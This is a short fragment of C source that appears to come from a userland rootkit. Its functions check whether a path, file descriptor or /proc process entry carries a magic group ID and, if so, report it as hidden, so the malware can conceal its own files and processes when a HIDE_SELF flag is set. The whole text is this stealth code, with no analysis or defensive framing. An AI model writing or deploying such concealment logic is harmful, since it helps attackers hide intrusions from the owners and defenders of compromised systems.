int _hidden_path(const char *pathname, short mode){
#ifndef HIDE_SELF
    return 0;
#endif
    if(pathname == NULL) return 0;
    if(mode == MODE_REG) { if(get_path_gid(pathname) == MAGIC_GID) return 1; }
    else if(mode == MODE_64) { if(get_path_gid64(pathname) == MAGIC_GID) return 1; }
    return 0;
}

int _f_hidden_path(int fd, short mode){
#ifndef HIDE_SELF
    return 0;
#endif
    if(mode == MODE_REG) { if(get_fd_gid(fd) == MAGIC_GID) return 1; }
    else if(mode == MODE_64) { if(get_fd_gid64(fd) == MAGIC_GID) return 1; }
    return 0;
}

int _l_hidden_path(const char *pathname, short mode){
#ifndef HIDE_SELF
    return 0;
#endif
    if(pathname == NULL) return 0;
    if(mode == MODE_REG) { if(lget_path_gid(pathname) == MAGIC_GID) return 1; }
    else if(mode == MODE_64) { if(lget_path_gid64(pathname) == MAGIC_GID) return 1; }
    return 0;
}

int hidden_proc(pid_t pid){
#ifndef HIDE_SELF
    return 0;
#endif
    char proc_path[256];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
    return _hidden_path(proc_path, MODE_REG);
}